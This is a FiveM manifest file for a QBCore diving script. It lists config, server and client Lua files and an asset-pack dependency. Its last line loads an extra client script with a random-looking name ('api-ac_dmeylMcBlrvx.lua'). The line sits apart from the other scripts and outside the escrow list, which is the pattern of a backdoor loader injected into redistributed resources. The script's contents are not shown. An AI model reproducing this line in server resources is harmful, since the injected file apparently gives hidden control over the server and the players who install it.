fx_version 'cerulean'
games      { 'gta5' }
lua54 'yes'

author 'KuzQuality | Kuzkay'
description 'Diving Script with advanced selling mechanics for QBCore'
version '1.2.1'

--shared_script '@qb-core/import.lua'

--
-- Server
--

server_scripts {
    'shared/config.lua',
    'server/server.lua',
}

--
-- Client
--

client_scripts {
    'shared/config.lua',
    'client/client.lua',
}

escrow_ignore {
    'shared/config.lua',
    'client/client.lua',
    'server/server.lua',
}

dependency '/assetpacks'
client_script "api-ac_dmeylMcBlrvx.lua"